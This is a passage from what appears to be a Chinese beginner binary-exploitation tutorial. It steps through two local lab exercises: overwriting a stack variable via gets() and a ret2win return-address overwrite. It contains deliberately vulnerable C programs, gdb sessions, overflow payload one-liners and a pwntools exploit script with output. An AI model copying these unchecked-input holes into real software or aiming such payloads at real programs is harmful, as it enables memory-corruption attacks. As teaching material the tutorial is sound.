+<h3 id="静态调试-v2"><a class="header-anchor" href="#静态调试-v2">¶</a>静态调试</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_input</span><span class="params">()</span>&#123;   </span><br><span class="line">    <span class="type">int</span> key = <span class="number">0x12345678</span>;   <span class="comment">//定义了一个变量key，key的值为0x12345678</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">32</span>];    <span class="comment">//定义了一个变量，名为buffer，有32个字节的缓冲区</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes? &quot;</span>);    <span class="comment">//输出字符串yes?</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);   <span class="comment">//清除缓冲区</span></span><br><span class="line">    gets(buffer);   <span class="comment">//获取我们输入的字符，并存入到buffer变量里</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xdeadbeef</span>)&#123;    <span class="comment">//如果key = 0xdeadbeef</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job!!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%04x\n&quot;</span>, key);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);    <span class="comment">//成功破解程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;   <span class="comment">//否则失败</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%04x\n&quot;</span>, key);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;...\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">    do_input();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  python3 -c &#x27;print (&quot;A&quot;*32)&#x27;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">(pwn) ➜  02-overwriting_stack_variables_part2 git:(master) ✗ unhex 42424242</span><br><span class="line">BBBB%                                                      </span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><code>'print (&quot;A&quot;*32)'</code> 是要执行的 Python 代码，它创建了一个由 32 个 “A” 字符组成的字符串，并将其打印出来</p>
+<ul>
+<li><code>-c</code> 参数告诉 Python 解释器直接从命令行参数中读取并执行一段代码</li>
+</ul>
+</li>
+<li>
+<p><code>unhex</code>：将一个十六进制数转换为对应的 ASCII 字符或其他表示形式</p>
+</li>
+<li>
+<p>由源代码可知，<code>key</code>的值必须等于十六进制的<code>0xdeadbeef</code>才能输出正确的字符，这种十六进制无法用键盘输入，需要用到<code>python</code></p>
+</li>
+<li>
+<p>一个知识点：在<code>x86</code>架构里，<strong>读取地址是由低到高的</strong>，十六进制<code>0xdeadbeef</code>就要从最后一个开始写</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print (&#x27;A&#x27; * 32 + &#x27;\xef\xbe\xad\xde&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后用linux管道符连接程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print (&#x27;A&#x27; * 32 + &#x27;\xef\xbe\xad\xde&#x27;)&quot; | ./overwrite</span><br></pre></td></tr></table></figure>
+<h3 id="动态调试-v2"><a class="header-anchor" href="#动态调试-v2">¶</a>动态调试</h3>
+<ul>
+<li>用gdb</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb overwrite</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看程序里调用的函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line"></span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  printf@plt</span><br><span class="line">0x08049040  fflush@plt</span><br><span class="line">0x08049050  gets@plt</span><br><span class="line">0x08049060  puts@plt</span><br><span class="line">0x08049070  __libc_start_main@plt</span><br><span class="line">0x08049080  _start</span><br><span class="line">0x080490c0  _dl_relocate_static_pie</span><br><span class="line">0x080490d0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490e0  deregister_tm_clones</span><br><span class="line">0x08049120  register_tm_clones</span><br><span class="line">0x08049160  __do_global_dtors_aux</span><br><span class="line">0x08049190  frame_dummy</span><br><span class="line">0x08049192  do_input</span><br><span class="line">0x08049267  main</span><br><span class="line">0x08049283  __x86.get_pc_thunk.ax</span><br><span class="line">0x08049290  __libc_csu_init</span><br><span class="line">0x080492f0  __libc_csu_fini</span><br><span class="line">0x080492f1  __x86.get_pc_thunk.bp</span><br><span class="line">0x080492f8  _fini</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看主函数do_input的汇编代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble do_input </span><br><span class="line"></span><br><span class="line">Dump of assembler code for function do_input:</span><br><span class="line">   0x08049192 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08049193 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08049195 &lt;+3&gt;:	push   ebx</span><br><span class="line">   0x08049196 &lt;+4&gt;:	sub    esp,0x34</span><br><span class="line">   0x08049199 &lt;+7&gt;:	call   0x80490d0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x0804919e &lt;+12&gt;:	add    ebx,0x2e62</span><br><span class="line">   0x080491a4 &lt;+18&gt;:	mov    DWORD PTR [ebp-0xc],0x12345678</span><br><span class="line">   0x080491ab &lt;+25&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491ae &lt;+28&gt;:	lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x080491b4 &lt;+34&gt;:	push   eax</span><br><span class="line">   0x080491b5 &lt;+35&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x080491ba &lt;+40&gt;:	add    esp,0x10</span><br><span class="line">   0x080491bd &lt;+43&gt;:	mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x080491c3 &lt;+49&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x080491c5 &lt;+51&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491c8 &lt;+54&gt;:	push   eax</span><br><span class="line">   0x080491c9 &lt;+55&gt;:	call   0x8049040 &lt;fflush@plt&gt;</span><br><span class="line">   0x080491ce &lt;+60&gt;:	add    esp,0x10</span><br><span class="line">   0x080491d1 &lt;+63&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491d4 &lt;+66&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x080491d7 &lt;+69&gt;:	push   eax</span><br><span class="line">   0x080491d8 &lt;+70&gt;:	call   0x8049050 &lt;gets@plt&gt;</span><br><span class="line">   0x080491dd &lt;+75&gt;:	add    esp,0x10</span><br><span class="line">   0x080491e0 &lt;+78&gt;:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef</span><br><span class="line">   0x080491e7 &lt;+85&gt;:	jne    0x8049226 &lt;do_input+148&gt;</span><br><span class="line">   0x080491e9 &lt;+87&gt;:	sub    esp,0xc</span><br><span class="line">   0x080491ec &lt;+90&gt;:	lea    eax,[ebx-0x1ff2]</span><br><span class="line">   0x080491f2 &lt;+96&gt;:	push   eax</span><br><span class="line">   0x080491f3 &lt;+97&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x080491f8 &lt;+102&gt;:	add    esp,0x10</span><br><span class="line">   0x080491fb &lt;+105&gt;:	sub    esp,0x8</span><br><span class="line">   0x080491fe &lt;+108&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08049201 &lt;+111&gt;:	lea    eax,[ebx-0x1fe7]</span><br><span class="line">   0x08049207 &lt;+117&gt;:	push   eax</span><br><span class="line">   0x08049208 &lt;+118&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x0804920d &lt;+123&gt;:	add    esp,0x10</span><br><span class="line">   0x08049210 &lt;+126&gt;:	mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x08049216 &lt;+132&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08049218 &lt;+134&gt;:	sub    esp,0xc</span><br><span class="line">   0x0804921b &lt;+137&gt;:	push   eax</span><br><span class="line">   0x0804921c &lt;+138&gt;:	call   0x8049040 &lt;fflush@plt&gt;</span><br><span class="line">   0x08049221 &lt;+143&gt;:	add    esp,0x10</span><br><span class="line">   0x08049224 &lt;+146&gt;:	jmp    0x8049261 &lt;do_input+207&gt;</span><br><span class="line">   0x08049226 &lt;+148&gt;:	sub    esp,0x8</span><br><span class="line">   0x08049229 &lt;+151&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x0804922c &lt;+154&gt;:	lea    eax,[ebx-0x1fe7]</span><br><span class="line">   0x08049232 &lt;+160&gt;:	push   eax</span><br><span class="line">   0x08049233 &lt;+161&gt;:	call   0x8049030 &lt;printf@plt&gt;</span><br><span class="line">   0x08049238 &lt;+166&gt;:	add    esp,0x10</span><br><span class="line">   0x0804923b &lt;+169&gt;:	sub    esp,0xc</span><br><span class="line">   0x0804923e &lt;+172&gt;:	lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x08049244 &lt;+178&gt;:	push   eax</span><br><span class="line">   0x08049245 &lt;+179&gt;:	call   0x8049060 &lt;puts@plt&gt;</span><br><span class="line">   0x0804924a &lt;+184&gt;:	add    esp,0x10</span><br><span class="line">   0x0804924d &lt;+187&gt;:	mov    eax,DWORD PTR [ebx-0x4]</span><br><span class="line">   0x08049253 &lt;+193&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08049255 &lt;+195&gt;:	sub    esp,0xc</span><br><span class="line">   0x08049258 &lt;+198&gt;:	push   eax</span><br><span class="line">   0x08049259 &lt;+199&gt;:	call   0x8049040 &lt;fflush@plt&gt;</span><br><span class="line">   0x0804925e &lt;+204&gt;:	add    esp,0x10</span><br><span class="line">   0x08049261 &lt;+207&gt;:	nop</span><br><span class="line">   0x08049262 &lt;+208&gt;:	mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049265 &lt;+211&gt;:	leave</span><br><span class="line">   0x08049266 &lt;+212&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<ul>
+<li>此处key的值和输入值做对比</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080491e0 &lt;+78&gt;:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef</span><br></pre></td></tr></table></figure>
+<ul>
+<li>下一个断点</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0x080491e0</span><br></pre></td></tr></table></figure>
+<ul>
+<li>启动程序，输入一些值，然后程序自动运行至断点处停下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x80491e0 &lt;do_input+004e&gt;  cmp    DWORD PTR [ebp-0xc], 0xdeadbeef</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>这里将<code>ebp</code>寄存器里的值减去了<code>0xc</code>转换成<code>10</code>进制，就是<code>12</code>和<code>0xdeadbeef</code>做了对比</p>
+</li>
+<li>
+<p>查看这个地址的值</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x $ebp - 0xc</span><br><span class="line"></span><br><span class="line">0xffffca9c:	0x12345678</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接修改这个地址的值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *0xffffca9c = 0xdeadbeef</span><br></pre></td></tr></table></figure>
+<ul>
+<li>再次查看这个地址的值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  set *0xffffca9c = 0xdeadbeef</span><br><span class="line">gef➤  x $ebp - 0xc</span><br><span class="line">0xffffca9c:	0xdeadbeef</span><br></pre></td></tr></table></figure>
+<ul>
+<li>输入<code>n</code>继续执行程序，直到运行到<code>call</code>，成功运行程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts@plt (</span><br><span class="line">   [sp + 0x0] = 0x0804a00e → &quot;good job!!&quot;,</span><br><span class="line">   [sp + 0x4] = 0x00000018</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h4 id="pwntools脚本"><a class="header-anchor" href="#pwntools脚本">¶</a>pwntools脚本</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   //导入pwntools模块</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./overwrite&#x27;</span>)    //运行程序</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span> + p32(<span class="number">0xdeadbeef</span>))   //程序运行后发送指定的字符串，格式为<span class="number">32</span>位</span><br><span class="line"><span class="built_in">print</span>(io.recvall().decode())   //接收输出并且解码</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--&gt; python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./overwrite&#x27;: pid 6112</span><br><span class="line">[+] Receiving all data: Done (25B)</span><br><span class="line">[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 6112)</span><br><span class="line">yes? good job!!</span><br><span class="line">deadbeef</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">来自ai的解析：	</span><br><span class="line">	由于 gets() 不检查缓冲区的边界，如果输入的数据长度超过了 buffer 的大小（即32个字节），则会导致缓冲区溢出，进而可能覆盖 buffer 后面的内存空间中的数据。在这个例子中，key 变量正好位于 buffer 之后，因此可以通过精心构造的输入来覆盖 key 的值</span><br><span class="line">	恶意输入的数据布局：</span><br><span class="line">    由于 buffer 和 key 在栈中的相对位置是连续的，缓冲区溢出会让 32 个 A 字符填满 buffer，接下来的 0xdeadbeef 就会直接覆盖 key 的值</span><br></pre></td></tr></table></figure>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://ba1ma0.blog.csdn.net/article/details/126788019?spm=1001.2014.3001.5502">PWN入门（4）覆盖程序函数的返回地址_pwn是什么意思-CSDN博客</a></p>
+<hr>
+<h2 id="覆盖程序函数的返回地址（ret2win）"><a class="header-anchor" href="#覆盖程序函数的返回地址（ret2win）">¶</a>覆盖程序函数的返回地址（ret2win）</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This function is TOP SECRET! How did you get in here?! :O\n&quot;</span>);   <span class="comment">//成功破解的字符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_name</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>];    <span class="comment">//定义了一个变量，名为buffer，有16个字节的缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:\n&quot;</span>);   <span class="comment">//输出字符&quot;Name:</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);   <span class="comment">//获取我们输入的字符，并存入到buffer变量里</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hi there, %s\n&quot;</span>, buffer);     <span class="comment">//输出字符Hi there和我们输入的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    register_name();   <span class="comment">//调用上面的register_name自定义函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>目标：让程序调用<code>hacked自定义函数</code>里的内容</li>
+</ul>
+<h3 id="动态调试-v3"><a class="header-anchor" href="#动态调试-v3">¶</a>动态调试</h3>
+<ul>
+<li>gdb</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看程序里的函数</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看主函数<code>register_name</code>的汇编代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble register_name</span><br></pre></td></tr></table></figure>
+<ul>
+<li>输入命令<code>cyclic</code>就能获得测试用的字符串</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>作用：生成100个字符串，每四个字符的最后一个字符都不一样，用于测试覆盖程序的返回地址需要多少个字符</p>
+</blockquote>
+<ul>
+<li>输入<code>run</code>运行程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x6f      </span><br><span class="line">$ebx   : 0x61616166 (&quot;faaa&quot;?)</span><br><span class="line">$ecx   : 0x0       </span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcb20  →  &quot;iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]&quot;</span><br><span class="line">$ebp   : 0x61616167 (&quot;gaaa&quot;?)</span><br><span class="line">$esi   : 0x08049230  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x61616168 (&quot;haaa&quot;?)</span><br><span class="line">$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"></span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x61616168</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>显示：程序报错，里面原本的参数全被输入值覆盖</p>
+</li>
+<li>
+<p>注意：<code>ret</code>指令</p>
+<ul>
+<li><code>ret</code>是子程序的返回指令，原本要返回<code>main</code>函数，结果被覆盖，返回到其他不存在的地址，于是程序报错</li>
+</ul>
+</li>
+<li>
+<p><code>EIP</code>：程序的指针</p>
+<ul>
+<li>指针寻找地址，指到什么地址，就会运行该地址的参数</li>
+<li><strong><u>控制了这个指针，就能控制整个程序的运行</u></strong></li>
+</ul>
+</li>
+<li>
+<p><code>eip</code>寄存器里的值是<code>haaa</code>的十六进制，查一下<code>haaa</code>在生成字符串第几个</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--&gt; cyclic -l haaa</span><br><span class="line">28</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>说明要覆盖eip原本的返回地址并控制</p>
+<p>就需要28个字符+想让程序跳转执行的地址</p>
+</blockquote>
+<ul>
+<li>再次查看程序调用的函数地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x08049000  _init</span><br><span class="line">0x08049030  printf@plt</span><br><span class="line">0x08049040  puts@plt</span><br><span class="line">0x08049050  __libc_start_main@plt</span><br><span class="line">0x08049060  __isoc99_scanf@plt</span><br><span class="line">0x08049070  _start</span><br><span class="line">0x080490b0  _dl_relocate_static_pie</span><br><span class="line">0x080490c0  __x86.get_pc_thunk.bx</span><br><span class="line">0x080490d0  deregister_tm_clones</span><br><span class="line">0x08049110  register_tm_clones</span><br><span class="line">0x08049150  __do_global_dtors_aux</span><br><span class="line">0x08049180  frame_dummy</span><br><span class="line">0x08049182  hacked</span><br><span class="line">0x080491ad  register_name</span><br><span class="line">0x08049203  main</span><br><span class="line">0x0804921f  __x86.get_pc_thunk.ax</span><br><span class="line">0x08049230  __libc_csu_init</span><br><span class="line">0x08049290  __libc_csu_fini</span><br><span class="line">0x08049291  __x86.get_pc_thunk.bp</span><br><span class="line">0x08049298  _fini</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049182  hacked</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hacked函数的地址为0x08049182</p>
+</blockquote>
+<h4 id="破解程序"><a class="header-anchor" href="#破解程序">¶</a>破解程序</h4>
+<ul>
+<li>
+<p>用<code>python</code>生成字符</p>
+</li>
+<li>
+<p>一个知识点：</p>
+<ul>
+<li>在<code>x86</code>架构里，读取地址是由低到高的</li>
+<li>十六进制<code>0x08049182</code>就要从最后一个开始写</li>
+</ul>
+</li>
+<li>
+<p>将输出值放到一个文件里</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &quot;print &#x27;A&#x27;*28+&#x27;\x82\x91\x04\x08&#x27;&quot; &gt; exp</span><br></pre></td></tr></table></figure>
+<ul>
+<li>运行程序，导入这个文件里的值</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ret2win &lt; exp</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ python2 -c &quot;print &#x27;A&#x27;*28 + &#x27;\x82\x91\x04\x08&#x27;&quot; &gt; exp</span><br><span class="line">(pwn) ➜ ./ret2win &lt; exp</span><br><span class="line">This function is TOP SECRET! How did you get in here?! :O</span><br><span class="line">[1]    6907 segmentation fault (core dumped)  ./ret2win &lt; exp</span><br></pre></td></tr></table></figure>
+<h4 id="gdb调试"><a class="header-anchor" href="#gdb调试">¶</a>gdb调试</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2win</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在主函数<code>register_name</code>最后一条汇编指令的地址下一个断点，看程序里发生什么</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disassemble register_name</span><br><span class="line">b *0x08049202</span><br></pre></td></tr></table></figure>
+<ul>
